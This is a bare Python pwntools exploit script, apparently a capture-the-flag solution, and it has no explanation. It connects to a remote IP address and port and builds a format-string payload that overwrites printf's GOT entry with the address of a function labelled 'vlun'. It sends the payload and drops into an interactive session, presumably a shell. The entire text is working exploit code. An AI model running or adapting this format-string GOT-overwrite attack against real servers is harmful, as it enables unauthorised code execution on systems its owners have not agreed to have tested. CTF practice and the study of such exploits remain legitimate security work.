from pwn import *

io = remote('47.105.49.57', 39999)
e = ELF("./pwn")
vlun = 0x08048610
printf_got = e.got['printf']
payload = fmtstr_payload(6, {printf_got:vlun})
io.sendline(payload)
io.interactive()